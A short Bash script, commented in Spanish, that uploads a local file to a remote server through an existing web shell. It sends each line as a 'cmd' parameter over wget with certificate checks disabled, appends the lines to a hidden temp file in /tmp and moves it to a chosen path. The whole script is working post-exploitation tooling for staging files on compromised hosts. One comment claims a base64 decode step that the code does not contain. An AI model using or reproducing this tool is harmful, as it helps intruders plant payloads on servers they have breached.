#!/bin/bash

# comprobacion de parametros
if [ $# -ne 3 ]
then
        echo "usa: $0 <url> <fich orig> <fich dest>"
        exit -1
fi

# parametros de entrada
url=$1
fi=$2
fo=$3

# constantes constantes
tmpfile='/tmp/.uws_txt'

# ejecuta remotamente via webshell
function wsh
{
        # ejecuta remotamente
        #wget -q -O /dev/null "$url?cmd=$1"
        wget -q --no-check-certificate -O /dev/null "$url?cmd=$1"

        # error ?
        if [ $? -ne 0 ]
        then
                echo 'error: fallo de conexion!'
                exit -1
        fi
}

# existe el fichero ?
if [ ! -e $fi ]
then
        echo 'error: fichero no existe!'
        exit -1
fi

echo -n "Subiendo fichero"

# creamo fichero en destino
wsh "> $tmpfile"

# codificamos y enviamos linea a linea
for l in `cat $fi | sed -e 's/ /_/g'`
do
	l=`echo \'$l\' | sed -e 's/_/ /g' | sed -e 's/\\\\/\\\\\\\\/g'`
        wsh "echo $l >> $tmpfile"
        echo -n '.'
done

# decodificamos b64 a binario
wsh "mv $tmpfile $fo"

# borramos temporales
wsh "rm $tmpfile"

# fin 
echo ' hecho!'

